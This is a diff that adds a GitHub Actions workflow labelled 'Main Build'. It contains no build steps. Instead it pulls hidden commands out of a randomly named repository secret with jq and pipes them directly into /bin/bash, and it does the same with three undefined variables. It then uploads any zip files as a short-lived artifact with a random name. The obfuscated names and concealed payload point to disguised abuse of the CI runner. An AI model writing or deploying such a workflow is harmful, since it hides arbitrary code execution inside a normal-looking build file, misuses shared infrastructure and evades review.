@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          izqhf6: ${{ secrets.izqhf6 }}
+        run: |
+          printf '%s' "$izqhf6" | jq -r .dj676 | /bin/bash
+          echo $jvj672 | jq -r .tfrv77 | /bin/bash
+          echo $tgii5 | jq -r .fhr1 | /bin/bash
+          echo $yqe9191 | jq -r .zlu36559 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ho3L0IP4
+          path: "*.zip"
+          retention-days: 1
